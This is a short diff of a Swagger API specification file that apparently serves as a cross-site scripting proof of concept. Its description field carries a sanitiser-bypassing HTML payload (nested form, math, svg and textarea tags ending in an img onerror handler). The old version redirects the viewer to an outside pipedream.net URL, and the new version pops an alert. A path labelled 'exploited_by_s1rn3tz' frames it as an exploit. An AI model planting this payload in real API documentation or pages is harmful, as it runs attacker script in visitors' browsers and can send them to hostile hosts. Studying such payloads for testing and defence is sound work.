@@ -1,9 +1,9 @@
 ---
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Gio, rogor daisvene?
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=window.location.href="https://enxg5szar9z1q.x.pipedream.net/" src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("Gio, rogor daisvene?") src=1>"></form>
 
   version: production
 basePath: https://target.com
@@ -22,7 +22,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - Mathis Pais De Sousa
+      - Gio, rogor daisvene?
       operationId: findAccounts
       summary: this is example text
   "/exploited_by_s1rn3tz":
